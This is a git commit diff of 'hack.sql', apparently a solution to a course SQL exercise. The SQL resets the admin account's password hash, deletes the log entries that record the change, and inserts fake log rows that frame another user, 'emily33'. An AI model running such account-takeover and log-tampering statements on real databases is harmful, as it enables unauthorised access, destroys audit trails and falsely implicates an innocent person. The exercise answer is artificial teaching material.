5744ca1745ffe67e7a5c954cde2d78bd433e5807
Harshr24 <137977796+Harshr24@users.noreply.github.com>
2023-12-05 05:20:31 +0000

    Tue, Dec 5, 2023, 10:50 AM +05:30

--- dont-panic/hack.sql
+++ dont-panic/hack.sql
@@ -1,3 +1,16 @@
-UPDATE "users" SET "password" = '2bc7e02f2b84784917c964b3b52726e7' WHERE "username" = 'admin';
-DELETE FROM "user_logs" WHERE "type" = 'update' AND "old_username" = 'admin';
-INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password") SELECT 'update', 'emily33', NULL, NULL, '44bf025d27eea66336e5c1133c3827f7' WHERE NOT EXISTS ( SELECT 1 FROM "user_logs" WHERE "type" = 'update' AND "old_username" = 'emily33' AND "new_password" = '44bf025d27eea66336e5c1133c3827f7' );
+-- Alter the password of the website’s administrative account, admin, to instead be “oops!” (hashed)
+UPDATE "users"
+SET "password" = '982c0381c279d1d9689a23488b625834'
+WHERE "username" = 'admin';
+
+-- Erase any logs of the above password change recorded by the database
+DELETE FROM "user_logs"
+WHERE "type" = 'update' AND "old_username" = 'admin';
+
+-- Add false data to throw others off your trail - frame emily33 for password change to admin's password
+INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
+SELECT 'update', 'emily33', NULL, NULL, '982c0381c279d1d9689a23488b625834'
+WHERE NOT EXISTS (
+    SELECT 1 FROM "user_logs"
+    WHERE "type" = 'update' AND "old_username" = 'emily33' AND "new_password" = '982c0381c279d1d9689a23488b625834'
+);
